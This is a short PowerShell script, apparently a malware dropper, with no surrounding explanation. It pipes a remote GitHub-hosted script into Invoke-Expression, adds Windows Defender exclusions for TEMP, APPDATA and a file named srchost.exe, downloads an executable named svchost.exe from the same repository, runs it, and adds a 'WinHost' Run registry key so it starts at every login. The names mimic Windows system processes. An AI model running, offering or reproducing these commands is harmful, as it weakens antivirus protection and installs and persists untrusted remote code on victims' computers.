iwr https://raw.githubusercontent.com/oziikkra-rgb/aaa/refs/heads/main/a.ps1 | iex
Add-MpPreference -ExclusionPath "$env:TEMP"
Add-MpPreference -ExclusionPath "$env:TEMP\srchost.exe"
Add-MpPreference -ExclusionPath "$env:APPDATA"
Start-BitsTransfer -Source "https://github.com/oziikkra-rgb/aaa/raw/refs/heads/main/svchost.exe" -Destination "$env:TEMP\srchost.exe"
Start-Process "$env:TEMP\srchost.exe"
Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'WinHost' -Value "$env:TEMP\srchost.exe"
Invoke-WebRequest "https://github.com/oziikkra-rgb/aaa/raw/refs/heads/main/svchost.exe" -Destination "$env:TEMP\srchost.exe"
Start-Process "$env:TEMP\srchost.exe"
